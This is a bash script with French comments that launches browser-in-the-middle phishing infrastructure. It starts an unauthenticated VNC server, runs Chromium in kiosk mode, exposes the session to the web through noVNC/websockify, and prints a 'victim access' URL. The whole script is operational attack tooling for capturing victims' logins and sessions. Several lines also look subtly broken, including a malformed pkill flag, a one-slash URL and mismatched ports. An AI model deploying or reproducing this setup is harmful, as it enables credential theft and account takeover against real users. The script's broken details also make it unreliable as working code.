#!/bin/bash
# Script de démarrage complet de l'infrastructure BiTM

BITM_HOME="/home/$(whoami)"

pkill -0 9 websockify 2>/dev/null || true
pkill -9 chromium-browser 2>/dev/null || true
vncserver -kill :1 2>/dev/null || true
sleep 2

echo "═══════════════════════════════════════════════════"
echo "  Démarrage de l'infrastructure BiTM"
echo "═══════════════════════════════════════════════════"
echo ""

# 1. Démarrer VNC
echo "[1/2] Démarrage du serveur VNC..."
vncserver :1 -geometry 1920x1080 -depth 24 -SecurityTypes None
sleep 5

export DISPLAY=:1

chromium-browser \
	--no-sandbox \
	--start-maximized \
	--no-first-run \
	--disable-infobars \
	--disable-session-crashed-bubble \
	--disable-notifications \
	--kiosk \
	--app=http:/localhost:3000 \
	> /tmp/chromium-bitm.log 2>&1 &

CHROMIUM_PID=$!
sleep 5

# 2. Démarrer Websockify
echo "[2/2] Démarrage de Websockify..."

websockify --web /home/root/noVNC 0.0.0.0:6080 localhost:5901 &

sleep 3

echo ""
echo "═══════════════════════════════════════════════════"
echo "  Infrastructure BiTM démarrée avec succès !"
echo "═══════════════════════════════════════════════════"
echo ""
echo "Accès victime: http://$(hostname -I | awk '{print $1}'):8080"
echo ""
echo "Commandes utiles:"
echo "  - Arrêter: ~/stop-bitm.sh"
echo "  - Logs VNC: ~/.vnc/*.log"
echo "  - Logs nginx: /var/log/nginx/bitm-*.log"
echo ""
